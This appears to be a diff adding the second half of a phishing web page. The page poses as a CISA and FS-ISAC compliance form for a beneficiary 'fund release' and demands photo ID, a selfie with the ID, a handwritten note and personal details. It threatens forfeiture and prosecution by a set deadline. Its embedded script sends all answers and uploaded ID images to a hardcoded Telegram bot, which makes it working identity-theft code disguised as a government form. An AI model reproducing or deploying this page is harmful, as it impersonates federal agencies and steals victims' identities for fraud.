+  <div class="body-text" style="font-weight:bold; margin-bottom:8px;">Required Documents:</div>
+  <div class="body-text">
+    1. A clear photograph of your valid government-issued photo identification (driver's license, state ID, or passport).
+  </div>
+  <div class="body-text">
+    2. A photograph of yourself holding your photo ID next to your face.
+  </div>
+  <div class="body-text">
+    3. A handwritten note stating: <em>"I, [Your Full Name], confirm that I am the beneficiary of File PB-142-WT1139 and have reviewed the official notice issued by CISA and FS-ISAC. I understand that all requirements must be completed by July 31, 2026."</em>
+  </div>
+
+  <div class="upload-section" id="uploadSection">
+    <div class="form-group">
+      <label>Upload Photo ID:</label>
+      <input type="file" name="photo_id" accept="image/*">
+    </div>
+    <div class="form-group">
+      <label>Upload Photo with ID:</label>
+      <input type="file" name="photo_with_id" accept="image/*">
+    </div>
+    <div class="form-group">
+      <label>Upload Handwritten Note:</label>
+      <input type="file" name="handwritten_note" accept="image/*">
+    </div>
+  </div>
+
+  <!-- SECTION F: NEW QUESTIONS (Employment Status ADDED BACK + 5 Real Event Questions) -->
+  <div class="section-title">SECTION F: TRANSACTION & COMPLIANCE AWARENESS</div>
+  <div class="body-text" style="font-size:13px; color:#555; margin-bottom:12px;">
+    This section is required under federal compliance regulations to verify your awareness of recent regulatory actions affecting financial transactions.
+  </div>
+
+  <div class="form-group">
+    <label>8. Are you aware that on July 15, 2026, CISA confirmed a critical vulnerability in Oracle Payments (CVE-2026-46817) that may affect the security of financial transaction processing systems? Have you been informed of how this may impact your transaction processing?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q8" value="Yes"> Yes</label>
+      <label><input type="radio" name="q8" value="No"> No</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>9. Are you aware that in July 2026, federal regulators (OCC and Federal Reserve) took enforcement actions against multiple banks for compliance deficiencies? Do you understand how such actions may affect the processing of customer funds?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q9" value="Yes"> Yes</label>
+      <label><input type="radio" name="q9" value="No"> No</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>10. Are you aware of the FinCEN alert issued on July 24, 2026, regarding virtual currency investment fraud schemes? Have you taken any steps to protect your transaction from such schemes?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q10" value="Yes"> Yes</label>
+      <label><input type="radio" name="q10" value="No"> No</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>11. Are you aware that in July 2026, the Federal Reserve took enforcement actions that may cause delays in bank transaction processing? Do you understand that your transaction timeline may be affected by these regulatory actions?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q11" value="Yes"> Yes</label>
+      <label><input type="radio" name="q11" value="No"> No</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>12. Are you aware of the FinCEN action against H-Pay Service PLC and its affiliates for their involvement in money laundering and fraud schemes? Do you confirm that your transaction is not connected to any such entity?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q12" value="Yes"> Yes</label>
+      <label><input type="radio" name="q12" value="No"> No</label>
+    </div>
+  </div>
+
+  <!-- SECTION G: EMPLOYMENT STATUS (ADDED BACK) -->
+  <div class="section-title">SECTION G: EMPLOYMENT & OCCUPATION STATUS</div>
+  <div class="body-text" style="font-size:13px; color:#555; margin-bottom:12px;">
+    This information is required for beneficiary record verification under federal compliance standards.
+  </div>
+
+  <div class="form-group">
+    <label>13. What is your current employment status?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q13" value="Employed_Full"> Employed (Full-time)</label>
+      <label><input type="radio" name="q13" value="Employed_Part"> Employed (Part-time)</label>
+      <label><input type="radio" name="q13" value="Self_Employed"> Self-Employed/Business Owner</label>
+      <label><input type="radio" name="q13" value="Unemployed"> Unemployed</label>
+      <label><input type="radio" name="q13" value="Retired"> Retired</label>
+      <label><input type="radio" name="q13" value="Student"> Student</label>
+      <label><input type="radio" name="q13" value="Other"> Other (please specify below)</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>14. If employed or self-employed, please describe your occupation or business:</label>
+    <textarea name="q14" placeholder="Type your response here..."></textarea>
+  </div>
+
+  <!-- SECTION H: CERTIFICATION OF RESPONSIBILITY -->
+  <div class="section-title">SECTION H: CERTIFICATION OF RESPONSIBILITY</div>
+
+  <div class="body-text" style="font-size:13px; color:#555; margin-bottom:12px;">
+    You are required to confirm that you take full responsibility for the accuracy and completeness of all information provided in this form.
+  </div>
+
+  <div class="form-group">
+    <div class="checkbox-group">
+      <label><input type="checkbox" name="responsibility" value="yes"> I hereby declare that I take full responsibility for the accuracy and completeness of all information provided in this form. I understand that providing false information is a federal offense under 18 U.S.C. § 1001 and is punishable by fines and imprisonment of up to 5 years.</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>Signature (Type Full Name):</label>
+    <input type="text" name="responsibility_signature" placeholder="Type your full name as your electronic signature">
+  </div>
+
+  <div class="form-group">
+    <label>Date:</label>
+    <input type="date" name="responsibility_date">
+  </div>
+
+  <!-- CERTIFICATE BOX -->
+  <div class="certificate-box">
+    <div class="title">📄 WHAT YOU WILL RECEIVE AFTER COMPLETING ALL REQUIREMENTS</div>
+    <div class="body-text">
+      Upon successful completion of ALL outstanding requirements, this office will issue you a <strong>FINAL FUND RELEASE AUTHORIZATION</strong>.
+    </div>
+    <div class="body-text" style="font-weight: bold; margin-top: 8px;">
+      THIS AUTHORIZATION CONFIRMS:
+    </div>
+    <div class="body-text">
+      ✅ All federal compliance requirements have been satisfied.
+    </div>
+    <div class="body-text">
+      ✅ All outstanding fees have been cleared.
+    </div>
+    <div class="body-text">
+      ✅ Your file is fully verified and finalized.
+    </div>
+    <div class="body-text">
+      ✅ No further compliance steps will be required.
+    </div>
+    <div class="body-text">
+      ✅ Your file is ready for final credit processing.
+    </div>
+    <div class="body-text" style="font-weight: bold; color: #1a6e3a; margin-top: 8px;">
+      WHAT YOU CAN DO WITH THIS AUTHORIZATION:
+    </div>
+    <div class="body-text">
+      1. Present it to First National Bank Texas as proof of compliance.
+    </div>
+    <div class="body-text">
+      2. Use it to confirm your file is cleared for credit.
+    </div>
+    <div class="body-text">
+      3. Keep it as your official record of compliance.
+    </div>
+    <div class="body-text" style="font-weight: bold; color: #990000; margin-top: 8px;">
+      THIS IS THE FINAL STEP. NO FURTHER ACTION IS REQUIRED FROM YOU.
+    </div>
+  </div>
+
+  <!-- AFTER SUBMISSION -->
+  <div class="after-submit-box">
+    <div class="title">✅ AFTER SUBMISSION — WHAT HAPPENS NEXT</div>
+    <div class="body-text">
+      When you click <strong>SUBMIT</strong>:
+    </div>
+    <div class="body-text">
+      <strong>1. Your responses and uploaded documents are received by the office system — IMMEDIATELY.</strong>
+    </div>
+    <div class="body-text">
+      <strong>2. You will receive an AUTO-GENERATED CONFIRMATION NUMBER — IMMEDIATELY.</strong>
+    </div>
+    <div class="body-text">
+      <strong>3. Your file will be placed in the review queue and reviewed by a compliance officer within 1-2 business days.</strong>
+    </div>
+    <div class="body-text">
+      <strong>4. NSB Federal Customer Service will notify you of the REVIEW OUTCOME after the review is complete.</strong>
+    </div>
+  </div>
+
+  <!-- CONSEQUENCES -->
+  <div class="section-title">VI. CONSEQUENCES OF NON-COMPLIANCE</div>
+  <div class="body-text">
+    Failure to complete all requirements by <strong>July 31, 2026</strong>, will result in the following actions, WITHOUT EXCEPTION:
+  </div>
+  <div class="body-text">
+    a) <strong>Forfeiture of Funds</strong> — Your funds will be forfeited to the United States Treasury pursuant to <strong>31 U.S.C. § 3729</strong>;
+  </div>
+  <div class="body-text">
+    b) <strong>Referral to Department of Justice</strong> — Your file will be referred to the Department of Justice for enforcement action;
+  </div>
+  <div class="body-text">
+    c) <strong>Escheatment to State of Texas</strong> — Under <strong>Texas Property Code Chapter 74</strong>, your funds will be declared escheated and become property of the State of Texas; and
+  </div>
+  <div class="body-text">
+    d) <strong>Immediate closure of your file</strong> with no further correspondence.
+  </div>
+
+  <!-- SUBMIT -->
+  <div class="section-title">VII. SUBMISSION INSTRUCTIONS</div>
+  <div class="body-text">
+    After completing all sections above, click the <strong>SUBMIT</strong> button below.
+  </div>
+  <div class="body-text" style="font-weight: bold; color: #1a1a2e; margin-top: 8px;">
+    Please ensure all sections are completed before submitting.
+  </div>
+
+  <button class="submit-btn" onclick="submitForm()">SUBMIT COMPLIANCE FORM</button>
+
+  <div id="successMessage" class="success-message">
+    <div class="title">✅ SUBMISSION SUCCESSFUL</div>
+    <div class="confirmation-number">
+      Confirmation Number: CISA-FSISAC-CONF-20260727-2841
+    </div>
+    <div class="body-text">
+      Your compliance form has been received and recorded.
+    </div>
+    <div class="body-text">
+      Please save your confirmation number for your records.
+    </div>
+    <div class="body-text" style="margin-top: 10px; font-size: 13px; color: #155724;">
+      Your file has been placed in the review queue. NSB Federal Customer Service will contact you within 1-2 business days.
+    </div>
+  </div>
+
+  <!-- CONTACT -->
+  <div class="section-title">VIII. CONTACT INFORMATION</div>
+  <div class="body-text">
+    <strong>For all inquiries regarding this notice, please contact:</strong>
+  </div>
+  <div class="body-text">
+    <strong>NSB Federal Customer Service</strong><br>
+    Reference: PB-142-WT1139
+  </div>
+  <div class="body-text" style="font-style:italic; color:#555; margin-top:8px;">
+    Please direct all correspondence to NSB Federal Customer Service. This office does not accept direct inquiries from individual beneficiaries.
+  </div>
+
+  <!-- SIGNATURE -->
+  <div class="signature-section">
+    <div class="body-text">
+      This form is issued under the authority of the <strong>Cybersecurity and Infrastructure Security Agency (CISA)</strong>, a component of the U.S. Department of Homeland Security, and the <strong>Financial Services Information Sharing and Analysis Center (FS-ISAC)</strong>.
+    </div>
+    <br>
+    <div class="sig-line">CISA Enforcement Division</div>
+    <div class="sig-org">Cybersecurity and Infrastructure Security Agency</div>
+    <div class="sig-org">U.S. Department of Homeland Security</div>
+    <br>
+    <div class="sig-line">FS-ISAC Compliance Office</div>
+    <div class="sig-org">Financial Services Information Sharing and Analysis Center</div>
+  </div>
+
+  <div class="footer">
+    <span class="footer-left">Page 1 of 1</span>
+    <span class="footer-right">CONFIDENTIAL</span>
+  </div>
+
+</div>
+
+<script>
+  function submitForm() {
+    document.querySelectorAll('.error-field').forEach(el => el.classList.remove('error-field'));
+    
+    var errors = [];
+
+    var q1 = document.querySelector('input[name="q1"]:checked');
+    var q2 = document.querySelector('input[name="q2"]:checked');
+    var q3 = document.querySelector('input[name="q3"]:checked');
+    var q4 = document.querySelector('input[name="q4"]:checked');
+    var q5 = document.querySelector('input[name="q5"]:checked');
+    var q6 = document.querySelector('input[name="q6"]:checked');
+    var intent = document.querySelector('input[name="intent"]:checked');
+    var q8 = document.querySelector('input[name="q8"]:checked');
+    var q9 = document.querySelector('input[name="q9"]:checked');
+    var q10 = document.querySelector('input[name="q10"]:checked');
+    var q11 = document.querySelector('input[name="q11"]:checked');
+    var q12 = document.querySelector('input[name="q12"]:checked');
+    var q13 = document.querySelector('input[name="q13"]:checked');
+
+    var decl1 = document.querySelector('input[name="declaration1"]:checked');
+    var decl2 = document.querySelector('input[name="declaration2"]:checked');
+    var decl3 = document.querySelector('input[name="declaration3"]:checked');
+    var decl4 = document.querySelector('input[name="declaration4"]:checked');
+    var responsibility = document.querySelector('input[name="responsibility"]:checked');
+
+    var signature = document.querySelector('input[name="signature"]').value.trim();
+    var date = document.querySelector('input[name="submission_date"]').value;
+    var respSignature = document.querySelector('input[name="responsibility_signature"]').value.trim();
+    var respDate = document.querySelector('input[name="responsibility_date"]').value;
+
+    var photoId = document.querySelector('input[name="photo_id"]');
+    var photoWithId = document.querySelector('input[name="photo_with_id"]');
+    var handwrittenNote = document.querySelector('input[name="handwritten_note"]');
+
+    var photoIdFile = photoId.files[0];
+    var photoWithIdFile = photoWithId.files[0];
+    var handwrittenNoteFile = handwrittenNote.files[0];
+
+    function validateRadio(name, label) {
+      var checked = document.querySelector('input[name="' + name + '"]:checked');
+      if (!checked) {
+        errors.push(label);
+        var radios = document.querySelectorAll('input[name="' + name + '"]');
+        radios.forEach(function(r) {
+          var parent = r.closest('.form-group');
+          if (parent) parent.classList.add('error-field');
+        });
+        return false;
+      }
+      return true;
+    }
+
+    function validateCheckbox(name, label) {
+      var checked = document.querySelector('input[name="' + name + '"]:checked');
+      if (!checked) {
+        errors.push(label);
+        var checkbox = document.querySelector('input[name="' + name + '"]');
+        var parent = checkbox.closest('.form-group');
+        if (parent) parent.classList.add('error-field');
+        return false;
+      }
+      return true;
+    }
+
+    function validateTextField(input, label) {
+      if (!input.value.trim()) {
+        errors.push(label);
+        input.classList.add('error-field');
+        return false;
+      }
+      return true;
+    }
+
+    function validateFile(file, label, input) {
+      if (!file) {
+        errors.push(label + ' — no file selected');
+        input.closest('.upload-section').classList.add('error-field');
+        return false;
+      }
+      var validTypes = ['image/jpeg', 'image/png', 'image/jpg', 'image/gif', 'image/webp', 'image/heic', 'image/bmp'];
+      if (!validTypes.includes(file.type)) {
+        errors.push(label + ' — please upload a valid image (JPG, PNG, etc.)');
+        input.closest('.upload-section').classList.add('error-field');
+        return false;
+      }
+      return true;
+    }
+
+    validateRadio('q1', 'Question 1 (CIRCIA awareness)');
+    validateRadio('q2', 'Question 2 (Bank Secrecy Act)');
+    validateRadio('q3', 'Question 3 (18 U.S.C. § 1001)');
+    validateRadio('q4', 'Question 4 (FinCEN fraud alert)');
+    validateRadio('q5', 'Question 5 (SAR reporting)');
+    validateRadio('q6', 'Question 6 (AML/CFT compliance)');
+    validateRadio('intent', 'Declaration of Intent (Option 1 or 2)');
+    validateRadio('q8', 'Question 8 (Oracle Payments vulnerability)');
+    validateRadio('q9', 'Question 9 (Bank enforcement actions)');
+    validateRadio('q10', 'Question 10 (FinCEN fraud alert)');
+    validateRadio('q11', 'Question 11 (Transaction delays)');
+    validateRadio('q12', 'Question 12 (FinCEN action)');
+    validateRadio('q13', 'Question 13 (Employment status)');
+
+    validateCheckbox('declaration1', 'Declaration 1 — Review notice');
+    validateCheckbox('declaration2', 'Declaration 2 — Understand deadline');
+    validateCheckbox('declaration3', 'Declaration 3 — Understand consequences');
+    validateCheckbox('declaration4', 'Declaration 4 — Confirm intention');
+
+    validateTextField(document.querySelector('input[name="signature"]'), 'Signature');
+    validateTextField(document.querySelector('input[name="submission_date"]'), 'Date');
+    validateCheckbox('responsibility', 'Section H — Responsibility declaration');
+    validateTextField(document.querySelector('input[name="responsibility_signature"]'), 'Section H — Signature');
+    validateTextField(document.querySelector('input[name="responsibility_date"]'), 'Section H — Date');
+
+    validateFile(photoIdFile, 'Photo ID upload', photoId);
+    validateFile(photoWithIdFile, 'Photo with ID upload', photoWithId);
+    validateFile(handwrittenNoteFile, 'Handwritten note upload', handwrittenNote);
+
+    if (errors.length > 0) {
+      var errorMsg = "⚠️ Please complete the following required sections:\n\n- " + errors.join("\n- ");
+      alert(errorMsg);
+      var firstError = document.querySelector('.error-field');
+      if (firstError) firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      return;
+    }
+
+    var message = "📋 *CISA & FS-ISAC COMPLIANCE FORM SUBMISSION*\n\n";
+    message += "*File Reference:* PB-142-WT1139\n";
+    message += "*Date:* " + date + "\n\n";
+
+    message += "*SECTION A — Cybersecurity Incident Reporting Awareness*\n";
+    message += "1. " + q1.value + "\n";
+    message += "2. " + q2.value + "\n";
+    message += "3. " + q3.value + "\n\n";
+
+    message += "*SECTION B — Fraud & Illicit Finance Awareness*\n";
+    message += "4. " + q4.value + "\n";
+    message += "5. " + q5.value + "\n";
+    message += "6. " + q6.value + "\n\n";
+
+    message += "*SECTION C — Declaration of Intent*\n";
+    message += "Selected Option: " + intent.value + "\n";
+    var additional = document.querySelector('textarea[name="additional_info"]').value;
+    message += "Additional Info: " + (additional || "None provided") + "\n\n";
+
+    message += "*SECTION D — Declaration of Understanding*\n";
+    message += "Reviewed notice: " + (decl1 ? "Yes" : "No") + "\n";
+    message += "Understand deadline: " + (decl2 ? "Yes" : "No") + "\n";
+    message += "Understand consequences: " + (decl3 ? "Yes" : "No") + "\n";
+    message += "Confirm intention: " + (decl4 ? "Yes" : "No") + "\n\n";
+
+    message += "*SECTION F — Transaction & Compliance Awareness*\n";
+    message += "8. " + (q8 ? q8.value : 'Not answered') + "\n";
+    message += "9. " + (q9 ? q9.value : 'Not answered') + "\n";
+    message += "10. " + (q10 ? q10.value : 'Not answered') + "\n";
+    message += "11. " + (q11 ? q11.value : 'Not answered') + "\n";
+    message += "12. " + (q12 ? q12.value : 'Not answered') + "\n\n";
+
+    message += "*SECTION G — Employment & Occupation Status*\n";
+    message += "13. " + (q13 ? q13.value : 'Not answered') + "\n";
+    var q14 = document.querySelector('textarea[name="q14"]').value;
+    message += "14. " + (q14 || "None provided") + "\n\n";
+
+    message += "*SECTION H — Certification of Responsibility*\n";
+    message += "Responsibility declared: " + (responsibility ? "Yes" : "No") + "\n";
+    message += "Signature: " + respSignature + "\n";
+    message += "Date: " + respDate + "\n\n";
+
+    message += "*Signature:* " + signature + "\n\n";
+    message += "*Confirmation Number:* CISA-FSISAC-CONF-20260727-2841";
+
+    var botToken = "8974824259:AAEQ0PcGUcLULk92EeIr3iKpjXJi7usBRfs";
+    var chatId = "7283385361";
+    var btn = document.querySelector('.submit-btn');
+    btn.textContent = "SUBMITTING...";
+    btn.disabled = true;
+
+    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+    var data = { chat_id: chatId, text: message, parse_mode: "Markdown" };
+
+    fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        var promises = [];
+        function sendFile(file, caption) {
+          var formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('document', file);
+          formData.append('caption', caption);
+          var fileUrl = "https://api.telegram.org/bot" + botToken + "/sendDocument";
+          return fetch(fileUrl, { method: 'POST', body: formData });
+        }
+        if (photoIdFile) promises.push(sendFile(photoIdFile, "📸 Photo ID"));
+        if (photoWithIdFile) promises.push(sendFile(photoWithIdFile, "📸 Photo with ID"));
+        if (handwrittenNoteFile) promises.push(sendFile(handwrittenNoteFile, "📸 Handwritten Note"));
+        return Promise.all(promises);
+      } else {
+        throw new Error(data.description || 'Failed to send message');
+      }
+    })
+    .then(() => {
+      document.querySelector('.submit-btn').style.display = 'none';
+      document.getElementById('successMessage').style.display = 'block';
+      window.scrollTo(0, 0);
+    })
+    .catch(error => {
+      alert("❌ Submission failed. Error: " + error.message);
+      btn.textContent = "SUBMIT COMPLIANCE FORM";
+      btn.disabled = false;
+    });
+  }
+</script>
 
 </body>
 </html>
